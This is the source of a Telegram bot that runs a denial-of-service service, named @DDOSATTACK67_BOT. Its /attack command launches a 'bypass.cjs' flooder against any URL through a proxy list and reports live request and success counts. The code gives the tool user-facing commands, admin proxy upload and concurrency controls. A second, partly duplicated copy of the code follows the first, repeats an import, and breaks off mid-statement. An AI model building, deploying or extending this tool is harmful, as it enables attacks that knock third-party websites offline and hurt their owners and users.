import { Telegraf } from 'telegraf';
import { spawn } from 'child_process';
import fs from 'fs';
import dotenv from 'dotenv';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import sqlite3 from 'sqlite3';
import { createCanvas } from 'canvas';
import cron from 'node-cron';
import express from 'express';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Load environment variables
dotenv.config();
console.log('📁 Loading .env file...');

// DEBUG: Check token
console.log('🔍 TOKEN CHECK:');
console.log('- Token exists:', !!process.env.TELEGRAM_BOT_TOKEN);
console.log('- Token length:', process.env.TELEGRAM_BOT_TOKEN?.length);
console.log('- Token prefix:', process.env.TELEGRAM_BOT_TOKEN?.substring(0, 10) + '...');

const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error('❌ ERROR: TELEGRAM_BOT_TOKEN not found in .env file!');
    console.error('📌 Make sure to set TELEGRAM_BOT_TOKEN in Railway Variables');
    process.exit(1);
}
console.log('✅ Token loaded successfully');

const bot = new Telegraf(token);

// Admin ID - YOU
const ADMIN_ID = '6247762383';

// Configuration
const CONFIG = {
    MAX_CONCURRENT_ATTACKS: 3,
    UPDATE_INTERVAL: 5000,
    MIN_UPDATE_PERCENT: 5,
    MESSAGE_CACHE_TIME: 3000,
    MAX_PROXY_LINES: 1000,
    BOT_NETWORK: [] // Add other bot tokens here for broadcasting
};

// Store running attacks
const attacks = new Map();
const lastUpdates = new Map();
const lastPercent = new Map();
const templates = new Map();
const schedule = new Map();
const botNetwork = CONFIG.BOT_NETWORK;

// Initialize SQLite database
const db = new sqlite3.Database('attacks.db');
db.run(`CREATE TABLE IF NOT EXISTS attacks (
    id TEXT PRIMARY KEY,
    url TEXT,
    duration INTEGER,
    requests INTEGER,
    success INTEGER,
    fail INTEGER,
    rate INTEGER,
    threads INTEGER,
    timestamp INTEGER,
    username TEXT
)`);

// ========== HEALTH CHECK SERVER FOR RAILWAY ==========
const app = express();
const port = process.env.PORT || 3000;
const HOST = '::';  // Bind to IPv6 for Railway

// Helper function to count running attacks
function countRunningAttacks() {
    let count = 0;
    for (const attack of attacks.values()) {
        if (attack.isRunning) count++;
    }
    return count;
}

// Basic root endpoint
app.get('/', (req, res) => {
    res.status(200).send(`
        <html>
            <head><title>Telegram Bypass Bot</title></head>
            <body style="font-family: Arial; text-align: center; padding: 50px;">
                <h1>🤖 Telegram Bypass Bot</h1>
                <p>Status: <span style="color: green; font-weight: bold;">RUNNING</span></p>
                <p>Active Attacks: ${attacks.size}</p>
                <p>Uptime: ${Math.floor(process.uptime() / 60)} minutes</p>
                <p><a href="/health">View Health Details</a></p>
            </body>
        </html>
    `);
});

// Health check endpoint
app.get('/health', (req, res) => {
    const memory = process.memoryUsage();
    const running = countRunningAttacks();
    
    res.status(200).json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        bot: {
            username: '@DDOSATTACK67_BOT',
            admin_id: ADMIN_ID,
            attacks: {
                total: attacks.size,
                running: running,
                config_limit: CONFIG.MAX_CONCURRENT_ATTACKS
            }
        }
    });
});

// Start server
const server = app.listen(port, HOST, () => {
    console.log(`🌐 Health check server running on port ${port}`);
    console.log(`🔧 Bound to host: ${HOST}`);
});

server.on('error', (err) => {
    console.error('❌ Server error:', err);
});
// ========== END HEALTH CHECK SERVER ==========

// ========== BOT CONNECTION TEST ==========
async function testBotConnection() {
    try {
        const botInfo = await bot.telegram.getMe();
        console.log('✅ Bot connected to Telegram!');
        console.log(`📱 Bot username: @${botInfo.username}`);
        console.log(`🆔 Bot ID: ${botInfo.id}`);
        return true;
    } catch (err) {
        console.error('❌ Cannot connect to Telegram:');
        console.error('- Error:', err.message);
        console.error('- Description:', err.description || 'No description');
        return false;
    }
}

// ========== START BOT WITH POLLING ==========
async function startBot() {
    console.log('🤖 Starting bot with polling...');
    
    try {
        // Test connection first
        const connected = await testBotConnection();
        if (!connected) {
            throw new Error('Failed to connect to Telegram');
        }
        
        // Clear any existing webhook
        await bot.telegram.deleteWebhook();
        console.log('✅ Webhook cleared');
        
        // Start polling
        await bot.launch();
        console.log('✅ Bot is polling for updates!');
        console.log('📱 Send /start to @DDOSATTACK67_BOT');
        
    } catch (err) {
        console.error('❌ Failed to start bot:');
        console.error('- Error:', err.message);
        
        // Retry after 10 seconds
        console.log('⏰ Retrying in 10 seconds...');
        setTimeout(startBot, 10000);
    }
}

// Start the bot
startBot();

// Enable graceful stop
process.once('SIGINT', () => {
    console.log('\n🛑 Stopping bot...');
    bot.stop('SIGINT');
    db.close();
    process.exit(0);
});
process.once('SIGTERM', () => {
    console.log('\n🛑 Stopping bot...');
    bot.stop('SIGTERM');
    db.close();
    process.exit(0);
});

// ========== BOT COMMANDS START HERE ==========

// Start command
bot.start((ctx) => {
    const userId = ctx.from.id.toString();
    const isAdmin = userId === ADMIN_ID;
    
    ctx.reply(
        `🔥 *ULTIMATE BYPASS CONTROLLER* 🔥\n\n` +
        `👋 Hello ${ctx.from.first_name}!\n` +
        `📊 Status: ✅ Online\n` +
        `👑 Role: ${isAdmin ? '⭐ Admin' : '👤 User'}\n\n` +
        `📌 *Main Commands:*\n` +
        `├ /attack - Start attack\n` +
        `├ /list - Show attacks\n` +
        `├ /stats - View statistics\n` +
        `├ /help - All commands\n` +
        `└ /status - Bot health\n\n` +
        `⚡ *Ready for action!*`,
        { parse_mode: 'Markdown' }
    );
});

// Help command
bot.help((ctx) => {
    const userId = ctx.from.id.toString();
    const isAdmin = userId === ADMIN_ID;
    
    let helpText = 
        `📚 *COMMANDS*\n\n` +
        `━━━━━━━━━━━━━━\n` +
        `🎯 *ATTACK COMMANDS*\n` +
        `━━━━━━━━━━━━━━\n` +
        `/attack \`<url> <time> <rate> <threads>\`\n` +
        `└ Start new attack\n` +
        `/stop \`<id>\`\n` +
        `└ Stop your attack\n` +
        `/list - Show active attacks\n` +
        `/progress \`<id>\` - Check progress\n\n`;
    
    if (isAdmin) {
        helpText += 
            `━━━━━━━━━━━━━━\n` +
            `👑 *ADMIN COMMANDS*\n` +
            `━━━━━━━━━━━━━━\n` +
            `/setproxy - Upload proxies\n` +
            `/stopall - Stop ALL attacks\n` +
            `/system - System stats\n\n`;
    }
    
    helpText += 
        `━━━━━━━━━━━━━━\n` +
        `ℹ️ *INFO*\n` +
        `━━━━━━━━━━━━━━\n` +
        `/stats - Bot statistics\n` +
        `/status - Bot health\n` +
        `/test - Test response`;
    
    ctx.reply(helpText, { parse_mode: 'Markdown' });
});

// Test command
bot.command('test', (ctx) => {
    ctx.reply('✅ *Bot is working!*', { parse_mode: 'Markdown' });
});

// Status command
bot.command('status', (ctx) => {
    ctx.reply(
        `✅ *Bot Status*\n\n` +
        `🟢 Online\n` +
        `⚡ Attacks: ${countRunningAttacks()} running\n` +
        `📊 Total: ${attacks.size}\n` +
        `📁 bypass.cjs: ${fs.existsSync('bypass.cjs') ? '✅' : '❌'}\n` +
        `📁 proxy.txt: ${fs.existsSync('proxy.txt') ? '✅' : '❌'}\n\n` +
        `🤖 @DDOSATTACK67_BOT`,
        { parse_mode: 'Markdown' }
    );
});

// Stats command
bot.command('stats', (ctx) => {
    const running = countRunningAttacks();
    const totalReqs = Array.from(attacks.values()).reduce((sum, a) => sum + (a.requestCount || 0), 0);
    
    const proxyCount = fs.existsSync('proxy.txt') 
        ? fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(l => l.includes(':')).length 
        : 0;
    
    ctx.reply(
        `📊 *Statistics*\n\n` +
        `▶️ Running: ${running}/${CONFIG.MAX_CONCURRENT_ATTACKS}\n` +
        `📊 Total Attacks: ${attacks.size}\n` +
        `📥 Total Requests: ${totalReqs}\n` +
        `🔄 Proxies: ${proxyCount}\n` +
        `⏱️ Uptime: ${Math.floor(process.uptime() / 60)}m`,
        { parse_mode: 'Markdown' }
    );
});

// Attack command
bot.command('attack', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [url, time, rate, threads] = args;

    if (!url || !time || !rate || !threads) {
        return ctx.reply(
            `❌ *Usage:*\n` +
            `/attack \`<url> <time> <rate> <threads>\`\n\n` +
            `📝 *Example:*\n` +
            `/attack \`https://httpbin.org/get 30 10 2\``,
            { parse_mode: 'Markdown' }
        );
    }

    // Check concurrent attacks limit
    const runningCount = countRunningAttacks();
    if (runningCount >= CONFIG.MAX_CONCURRENT_ATTACKS) {
        return ctx.reply(
            `⚠️ *Too Many Attacks*\n\n` +
            `Maximum ${CONFIG.MAX_CONCURRENT_ATTACKS} attacks allowed at once.`,
            { parse_mode: 'Markdown' }
        );
    }

    // Check if bypass.cjs exists
    if (!fs.existsSync('bypass.cjs')) {
        return ctx.reply('❌ Error: bypass.cjs file not found!');
    }

    const attackId = Date.now().toString();
    const duration = parseInt(time);
    const startTime = Date.now();
    
    // Send initial message
    const statusMsg = await ctx.reply(
        `🚀 *Attack Started*\n\n` +
        `📋 *ID:* \`${attackId}\`\n` +
        `🎯 *Target:* ${url}\n` +
        `⏱️ *Duration:* ${time}s\n` +
        `⚡ *Rate:* ${rate}/s\n` +
        `🧵 *Threads:* ${threads}\n\n` +
        `[${'⬜'.repeat(10)}] 0%`,
        { parse_mode: 'Markdown' }
    );

    try {
        // Spawn the attack process
        const attack = spawn('node', [
            'bypass.cjs',
            url,
            time,
            rate,
            threads,
            'proxy.txt',
            '--all',
            '--type', 'http'
        ]);

        // Store attack info
        attacks.set(attackId, {
            process: attack,
            url,
            startTime,
            duration,
            userId: ctx.from.id,
            username: ctx.from.username || ctx.from.first_name,
            chatId: ctx.chat.id,
            messageId: statusMsg.message_id,
            requestCount: 0,
            successCount: 0,
            failCount: 0,
            isRunning: true
        });

        // Handle stdout
        attack.stdout.on('data', (data) => {
            const attackData = attacks.get(attackId);
            if (!attackData) return;
            
            const output = data.toString();
            
            if (output.includes('Status: [')) {
                const match = output.match(/Status: \[([^\]]+)\]/);
                if (match) {
                    const parts = match[1].split(', ');
                    let total = 0;
                    let success = 0;
                    
                    parts.forEach(part => {
                        const [code, count] = part.split(': ');
                        if (count) {
                            const numCount = parseInt(count);
                            total += numCount;
                            if (code.startsWith('2')) success += numCount;
                        }
                    });
                    
                    attackData.requestCount = total;
                    attackData.successCount = success;
                    attackData.failCount = total - success;
                }
            }
        });

        attack.stderr.on('data', (data) => {
            console.error(`[${attackId}] Error:`, data.toString());
        });

        attack.on('close', (code) => {
            const attackData = attacks.get(attackId);
            if (!attackData) return;
            
            attackData.isRunning = false;
            
            const elapsed = Math.min(duration, Math.floor((Date.now() - startTime) / 1000));
            const successRate = attackData.requestCount > 0 
                ? Math.round((attackData.successCount / attackData.requestCount) * 100) 
                : 0;
            
            const finalMessage = 
                `✅ *Attack Completed*\n\n` +
                `📋 *ID:* \`${attackId}\`\n` +
                `⏱️ *Time:* ${elapsed}s/${duration}s\n` +
                `📊 *Requests:* ${attackData.requestCount || 0}\n` +
                `✅ *Success:* ${attackData.successCount || 0} (${successRate}%)\n` +
                `❌ *Failed:* ${attackData.failCount || 0}\n` +
                `⚡ *Exit Code:* ${code}`;
            
            ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null, finalMessage, { parse_mode: 'Markdown' });
            attacks.delete(attackId);
        });

    } catch (error) {
        ctx.reply('❌ Failed to start attack: ' + error.message);
    }
});

// List command
bot.command('list', (ctx) => {
    if (attacks.size === 0) {
        return ctx.reply('📊 *No Active Attacks*', { parse_mode: 'Markdown' });
    }

    let msg = '📊 *Active Attacks*\n\n';
    let count = 1;
    
    for (const [id, attack] of attacks) {
        if (!attack.isRunning) continue;
        
        const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
        const percent = Math.min(100, Math.floor((elapsed / attack.duration) * 100));
        const filled = Math.floor(percent / 10);
        const progressBar = '🟩'.repeat(filled) + '⬜'.repeat(10 - filled);
        
        msg += `*${count}.* \`${id.slice(-8)}\`\n`;
        msg += `   👤 @${attack.username}\n`;
        msg += `   🎯 ${attack.url.substring(0, 25)}...\n`;
        msg += `   📊 ${progressBar} ${percent}%\n`;
        msg += `   ⏱️ ${elapsed}s/${attack.duration}s\n`;
        count++;
        if (count > 5) break;
    }
    
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// Stop command
bot.command('stop', async (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    
    if (!attackId) {
        return ctx.reply('❌ Usage: `/stop <attack_id>`', { parse_mode: 'Markdown' });
    }
    
    const attack = attacks.get(attackId);
    if (!attack) {
        return ctx.reply('❌ Attack ID not found');
    }

    if (attack.userId !== ctx.from.id && ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ You can only stop your own attacks!');
    }

    try {
        attack.process.kill('SIGINT');
    } catch (err) {}
    
    attack.isRunning = false;
    ctx.reply(`✅ Attack \`${attackId}\` stopped.`, { parse_mode: 'Markdown' });
    attacks.delete(attackId);
});

// Setproxy command
bot.command('setproxy', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ *Unauthorized*', { parse_mode: 'Markdown' });
    }
    
    ctx.reply(
        `📤 *Proxy Upload*\n\n` +
        `Send a \`proxy.txt\` file with one proxy per line.\n\n` +
        `📝 *Format:* \`ip:port\``,
        { parse_mode: 'Markdown' }
    );
});

// Handle file upload
bot.on('document', async (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return;

    if (ctx.message.document.file_name === 'proxy.txt') {
        const waitMsg = await ctx.reply('🔄 Processing proxies...');
        
        try {
            const file = await ctx.telegram.getFile(ctx.message.document.file_id);
            const fileUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
            
            const response = await fetch(fileUrl);
            const content = await response.text();
            
            const proxies = content.split('\n')
                .map(line => line.trim())
                .filter(line => line && line.includes(':'));
            
            fs.writeFileSync('proxy.txt', proxies.join('\n'));
            
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                waitMsg.message_id,
                null,
                `✅ *Proxies Loaded*\n\n📊 ${proxies.length} proxies`,
                { parse_mode: 'Markdown' }
            );
        } catch (error) {
            ctx.reply('❌ Upload failed: ' + error.message);
        }
    }
});

// Stop all attacks
bot.command('stopall', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ Unauthorized');
    }
    
    const count = attacks.size;
    if (count === 0) {
        return ctx.reply('📊 No active attacks');
    }
    
    attacks.forEach((attack, id) => {
        if (attack.isRunning) {
            try {
                attack.process.kill('SIGINT');
            } catch (err) {}
        }
        attacks.delete(id);
    });
    
    ctx.reply(`🛑 Stopped ${count} attacks`);
});

// Progress command
bot.command('progress', (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    const attack = attacks.get(attackId);
    
    if (!attack) {
        return ctx.reply('❌ Attack ID not found');
    }
    
    const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
    const percent = Math.min(100, Math.floor((elapsed / attack.duration) * 100));
    const filled = Math.floor(percent / 10);
    const progressBar = '🟩'.repeat(filled) + '⬜'.repeat(10 - filled);
    
    ctx.reply(
        `📊 *Progress*\n\n` +
        `📋 *ID:* \`${attackId}\`\n` +
        `${progressBar} ${percent}%\n` +
        `⏱️ ${elapsed}s/${attack.duration}s\n` +
        `📥 ${attack.requestCount || 0} requests\n` +
        `Status: ${attack.isRunning ? '✅ Running' : '⏹️ Stopped'}`,
        { parse_mode: 'Markdown' }
    );
});

// Error handling
bot.catch((err, ctx) => {
    console.error('Bot error:', err);
});
import { Telegraf } from 'telegraf';
import { spawn } from 'child_process';
import fs from 'fs';
import dotenv from 'dotenv';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import express from 'express';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Load environment variables
dotenv.config();
console.log('📁 Loading .env file...');

const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error('❌ ERROR: TELEGRAM_BOT_TOKEN not found!');
    process.exit(1);
}
console.log('✅ Token loaded successfully');

const bot = new Telegraf(token);
const ADMIN_ID = '6247762383';

// Configuration
const CONFIG = {
    MAX_CONCURRENT_ATTACKS: 3,
    UPDATE_INTERVAL: 3000, // Update every 3 seconds
    MAX_PROXY_LINES: 1000
};

// Store running attacks
const attacks = new Map();
const attackMessages = new Map(); // Track message IDs for live updates

// ========== HEALTH CHECK SERVER ==========
import express from 'express';
const app = express();
const port = process.env.PORT || 3000;
const HOST = '::';

app.get('/', (req, res) => {
    res.status(200).send(`
        <html>
            <head><title>Telegram Bypass Bot</title>
            <style>body{font-family:Arial;text-align:center;padding:50px;background:#1a1a1a;color:#fff}</style>
            </head>
            <body>
                <h1>🤖 Telegram Bypass Bot</h1>
                <p>Status: <span style="color:#00ff00">● RUNNING</span></p>
                <p>Active Attacks: ${attacks.size}</p>
                <p>Uptime: ${Math.floor(process.uptime() / 60)} minutes</p>
                <p><a href="/health" style="color:#00ff00">Health Details</a></p>
            </body>
        </html>
    `);
});

app.get('/health', (req, res) => {
    res.status(200).json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        attacks: attacks.size,
        running: countRunningAttacks()
    });
});

app.listen(port, HOST, () => {
    console.log(`🌐 Health check server running on port ${port}`);
});

// ========== HELPER FUNCTIONS ==========
function countRunningAttacks() {
    let count = 0;
    for (const attack of attacks.values()) {
        if (attack.isRunning) count++;
    }
    return count;
}

function formatNumber(num) {
    return num?.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",") || "0";
}

function getStatusEmoji(status) {
    if (status >= 200 && status < 300) return '✅';
    if (status >= 300 && status < 400) return '🔄';
    if (status >= 400 && status < 500) return '❌';
    if (status >= 500) return '⚠️';
    return '⚪';
}

function createProgressBar(percent, size = 10) {
    const filled = Math.floor(percent / size);
    const empty = size - filled;
    return '🟩'.repeat(filled) + '⬜'.repeat(empty);
}

// ========== BOT COMMANDS ==========
bot.start((ctx) => {
    const isAdmin = ctx.from.id.toString() === ADMIN_ID;
    ctx.reply(
        `🔥 *ULTIMATE BYPASS CONTROLLER* 🔥\n\n` +
        `👋 Welcome, ${ctx.from.first_name}!\n` +
        `📊 Status: 🟢 Online\n` +
        `👑 Role: ${isAdmin ? '⭐ Admin' : '👤 User'}\n\n` +
        `📌 *Commands:*\n` +
        `├ /attack \`<url> <time> <rate> <threads>\`\n` +
        `├ /stop \`<id>\` - Stop attack\n` +
        `├ /list - Show attacks\n` +
        `├ /stats - Statistics\n` +
        `└ /help - More commands`,
        { parse_mode: 'Markdown' }
    );
});

bot.help((ctx) => {
    ctx.reply(
        `📚 *AVAILABLE COMMANDS*\n\n` +
        `🎯 *Attack*\n` +
        `/attack \`<url> <time> <rate> <threads>\`\n` +
        `Ex: \`/attack https://example.com 60 100 10\`\n\n` +
        `🛑 *Control*\n` +
        `/stop \`<id>\` - Stop attack\n` +
        `/list - Show active attacks\n` +
        `/progress \`<id>\` - Check progress\n\n` +
        `📊 *Info*\n` +
        `/stats - Bot statistics\n` +
        `/status - Bot health\n` +
        `/test - Test response\n\n` +
        `👑 *Admin*\n` +
        `/setproxy - Upload proxies\n` +
        `/stopall - Stop all attacks`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('test', (ctx) => ctx.reply('✅ *Bot is operational!*', { parse_mode: 'Markdown' }));

bot.command('status', (ctx) => {
    ctx.reply(
        `📊 *BOT STATUS*\n\n` +
        `🟢 Online\n` +
        `⚡ Attacks: ${countRunningAttacks()}/${CONFIG.MAX_CONCURRENT_ATTACKS}\n` +
        `📊 Total: ${attacks.size}\n` +
        `📁 Proxy: ${fs.existsSync('proxy.txt') ? '✅' : '❌'}\n` +
        `⏱️ Uptime: ${Math.floor(process.uptime() / 60)}m`,
        { parse_mode: 'Markdown' }
    );
});

// ========== ATTACK COMMAND WITH LIVE TRACKING ==========
bot.command('attack', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [url, time, rate, threads] = args;

    if (!url || !time || !rate || !threads) {
        return ctx.reply(
            `❌ *Usage:*\n` +
            `/attack \`<url> <time> <rate> <threads>\`\n\n` +
            `📝 *Example:*\n` +
            `/attack \`https://httpbin.org/get 30 50 5\``,
            { parse_mode: 'Markdown' }
        );
    }

    // Check concurrent attacks
    if (countRunningAttacks() >= CONFIG.MAX_CONCURRENT_ATTACKS) {
        return ctx.reply('⚠️ *Maximum concurrent attacks reached*', { parse_mode: 'Markdown' });
    }

    if (!fs.existsSync('bypass.cjs')) {
        return ctx.reply('❌ *Error:* bypass.cjs not found!', { parse_mode: 'Markdown' });
    }

    const attackId = Date.now().toString();
    const duration = parseInt(time);
    const startTime = Date.now();

    // Create initial attack message with progress bar
    const initialMessage = 
        `🚀 *ATTACK LAUNCHED* 🚀\n\n` +
        `📋 *ID:* \`${attackId}\`\n` +
        `🎯 *Target:* \`${url}\`\n` +
        `⏱️ *Duration:* ${time}s\n` +
        `⚡ *Rate:* ${rate}/s\n` +
        `🧵 *Threads:* ${threads}\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `${createProgressBar(0)} 0%\n` +
        `⏱️ 0s/${time}s\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📊 *Requests:* 0\n` +
        `✅ *Success:* 0\n` +
        `❌ *Failed:* 0\n` +
        `⚡ *Status:* ⏳ Initializing...`;

    const statusMsg = await ctx.reply(initialMessage, { parse_mode: 'Markdown' });

    // Spawn attack process
    const attack = spawn('node', [
        'bypass.cjs',
        url,
        time,
        rate,
        threads,
        'proxy.txt',
        '--all',
        '--type', 'http'
    ]);

    // Store attack data with tracking
    attacks.set(attackId, {
        process: attack,
        url,
        startTime,
        duration,
        userId: ctx.from.id,
        username: ctx.from.username || ctx.from.first_name,
        chatId: ctx.chat.id,
        messageId: statusMsg.message_id,
        requestCount: 0,
        successCount: 0,
        failCount: 0,
        statusCodes: {},
        isRunning: true,
        lastUpdate: Date.now()
    });

    // Track attack output for status codes
    attack.stdout.on('data', (data) => {
        const attackData = attacks.get(attackId);
        if (!attackData) return;
        
        const output = data.toString();
        
        // Parse status codes from output
        if (output.includes('Status: [')) {
            const match = output.match(/Status: \[([^\]]+)\]/);
            if (match) {
                const parts = match[1].split(', ');
                let total = 0;
                let success = 0;
                
                parts.forEach(part => {
                    const [code, count] = part.split(': ');
                    if (count) {
                        const numCount = parseInt(count);
                        total += numCount;
                        if (code.startsWith('2')) success += numCount;
                        attackData.statusCodes[code] = numCount;
                    }
                });
                
                attackData.requestCount = total;
                attackData.successCount = success;
                attackData.failCount = total - success;
            }
        }
    });

    attack.stderr.on('data', (data) => {
        console.error(`[${attackId}] Error:`, data.toString());
    });

    // Live update interval
    const updateInterval = setInterval(() => {
        const attackData = attacks.get(attackId);
        if (!attackData || !attackData.isRunning) {
            clearInterval(updateInterval);
            return;
        }

        const now = Date.now();
        const elapsed = Math.min(attackData.duration, Math.floor((now - attackData.startTime) / 1000));
        const percent = Math.min(100, Math.floor((elapsed / attackData.duration) * 100));
        
        // Calculate success rate
        const successRate = attackData.requestCount > 0 
            ? Math.round((attackData.successCount / attackData.requestCount) * 100) 
            : 0;
        
        // Get top status codes
        const topCodes = Object.entries(attackData.statusCodes)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 3)
            .map(([code, count]) => `${getStatusEmoji(parseInt(code))} ${code}: ${formatNumber(count)}`)
            .join(' | ');

        // Create progress bar
        const progressBar = createProgressBar(percent);
        
        // Status emoji based on success rate
        const statusEmoji = successRate > 70 ? '✅' : successRate > 30 ? '⚠️' : '❌';
        
        // Update message
        const updateMessage = 
            `🚀 *ATTACK IN PROGRESS* 🚀\n\n` +
            `📋 *ID:* \`${attackId}\`\n` +
            `🎯 *Target:* \`${attackData.url.substring(0, 40)}${attackData.url.length > 40 ? '...' : ''}\`\n\n` +
            `━━━━━━━━━━━━━━━━━━━\n` +
            `${progressBar} ${percent}%\n` +
            `⏱️ ${elapsed}s/${attackData.duration}s\n` +
            `━━━━━━━━━━━━━━━━━━━\n\n` +
            `📊 *TRAFFIC*\n` +
            `📥 Total: ${formatNumber(attackData.requestCount)}\n` +
            `✅ Success: ${formatNumber(attackData.successCount)} (${successRate}%)\n` +
            `❌ Failed: ${formatNumber(attackData.failCount)}\n\n` +
            `🔍 *STATUS CODES*\n` +
            `${topCodes || '📡 Collecting data...'}\n\n` +
            `${statusEmoji} *Status:* ${attackData.isRunning ? '⚡ Active' : '⏹️ Stopped'}\n` +
            `👤 @${attackData.username}`;

        ctx.telegram.editMessageText(attackData.chatId, attackData.messageId, null, updateMessage, { parse_mode: 'Markdown' })
            .catch(() => {}); // Ignore edit errors
    }, CONFIG.UPDATE_INTERVAL);

    // Handle attack completion
    attack.on('close', (code) => {
        clearInterval(updateInterval);
        
        const attackData = attacks.get(attackId);
        if (!attackData) return;
        
        attackData.isRunning = false;
        
        const elapsed = Math.min(attackData.duration, Math.floor((Date.now() - attackData.startTime) / 1000));
        const successRate = attackData.requestCount > 0 
            ? Math.round((attackData.successCount / attackData.requestCount) * 100) 
            : 0;
        
        // Determine final status
        let finalEmoji, finalStatus;
        if (code === 0) {
            finalEmoji = '✅';
            finalStatus = 'COMPLETED';
        } else if (attackData.requestCount > 0) {
            finalEmoji = successRate > 50 ? '⚠️' : '❌';
            finalStatus = successRate > 50 ? 'PARTIAL' : 'FAILED';
        } else {
            finalEmoji = '💥';
            finalStatus = 'CRASHED';
        }

        // Create status code breakdown
        const codeBreakdown = Object.entries(attackData.statusCodes)
            .sort((a, b) => b[1] - a[1])
            .map(([code, count]) => `${getStatusEmoji(parseInt(code))} ${code}: ${formatNumber(count)}`)
            .join('\n');

        const finalMessage = 
            `${finalEmoji} *ATTACK ${finalStatus}* ${finalEmoji}\n\n` +
            `📋 *ID:* \`${attackId}\`\n` +
            `🎯 *Target:* \`${attackData.url}\`\n\n` +
            `━━━━━━━━━━━━━━━━━━━\n` +
            `${createProgressBar(100)} 100%\n` +
            `⏱️ ${elapsed}s/${attackData.duration}s\n` +
            `━━━━━━━━━━━━━━━━━━━\n\n` +
            `📊 *FINAL STATISTICS*\n` +
            `📥 Total: ${formatNumber(attackData.requestCount)}\n` +
            `✅ Success: ${formatNumber(attackData.successCount)} (${successRate}%)\n` +
            `❌ Failed: ${formatNumber(attackData.failCount)}\n\n` +
            `🔍 *CODE BREAKDOWN*\n` +
            `${codeBreakdown || '📊 No data collected'}\n\n` +
            `⚡ Exit Code: ${code}\n` +
            `👤 @${attackData.username}`;

        ctx.telegram.editMessageText(attackData.chatId, attackData.messageId, null, finalMessage, { parse_mode: 'Markdown' })
            .catch(() => {});
        
        attacks.delete(attackId);
    });
});

// ========== STOP COMMAND ==========
bot.command('stop', async (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    
    if (!attackId) {
        return ctx.reply('❌ Usage: `/stop <attack_id>`', { parse_mode: 'Markdown' });
    }
    
    const attack = attacks.get(attackId);
    if (!attack) {
        return ctx.reply('❌ Attack not found. Use `/list` to see active attacks.', { parse_mode: 'Markdown' });
    }

    if (attack.userId !== ctx.from.id && ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ You can only stop your own attacks!');
    }

    attack.process.kill('SIGINT');
    attack.isRunning = false;
    
    ctx.reply(`🛑 Attack \`${attackId}\` stopped.`, { parse_mode: 'Markdown' });
});

// ========== LIST COMMAND ==========
bot.command('list', (ctx) => {
    if (attacks.size === 0) {
        return ctx.reply('📊 *No active attacks*', { parse_mode: 'Markdown' });
    }

    let msg = '📊 *ACTIVE ATTACKS*\n\n';
    let count = 1;
    
    for (const [id, attack] of attacks) {
        if (!attack.isRunning) continue;
        
        const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
        const percent = Math.min(100, Math.floor((elapsed / attack.duration) * 100));
        const successRate = attack.requestCount > 0 
            ? Math.round((attack.successCount / attack.requestCount) * 100) 
            : 0;
        
        const statusEmoji = successRate > 70 ? '✅' : successRate > 30 ? '⚠️' : '❌';
        
        msg += `*${count}.* \`${id.slice(-8)}\`\n`;
        msg += `   👤 @${attack.username}\n`;
        msg += `   🎯 ${attack.url.substring(0, 30)}...\n`;
        msg += `   📊 ${createProgressBar(percent, 5)} ${percent}%\n`;
        msg += `   ${statusEmoji} ${successRate}% | 📥 ${formatNumber(attack.requestCount)}\n\n`;
        count++;
        if (count > 5) break;
    }
    
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// ========== PROGRESS COMMAND ==========
bot.command('progress', (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    const attack = attacks.get(attackId);
    
    if (!attack) {
        return ctx.reply('❌ Attack not found');
    }
    
    const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
    const percent = Math.min(100, Math.floor((elapsed / attack.duration) * 100));
    const successRate = attack.requestCount > 0 
        ? Math.round((attack.successCount / attack.requestCount) * 100) 
        : 0;
    
    const progressBar = createProgressBar(percent, 10);
    
    ctx.reply(
        `📊 *ATTACK DETAILS*\n\n` +
        `📋 *ID:* \`${attackId}\`\n` +
        `🎯 *Target:* ${attack.url}\n` +
        `${progressBar} ${percent}%\n` +
        `⏱️ ${elapsed}s/${attack.duration}s\n\n` +
        `📥 Requests: ${formatNumber(attack.requestCount)}\n` +
        `✅ Success: ${formatNumber(attack.successCount)} (${successRate}%)\n` +
        `❌ Failed: ${formatNumber(attack.failCount)}\n\n` +
        `⚡ Status: ${attack.isRunning ? '✅ Running' : '⏹️ Stopped'}`,
        { parse_mode: 'Markdown' }
    );
});

// ========== STATS COMMAND ==========
bot.command('stats', (ctx) => {
    const running = countRunningAttacks();
    const totalReqs = Array.from(attacks.values()).reduce((s, a) => s + (a.requestCount || 0), 0);
    const totalSuccess = Array.from(attacks.values()).reduce((s, a) => s + (a.successCount || 0), 0);
    
    const proxyCount = fs.existsSync('proxy.txt') 
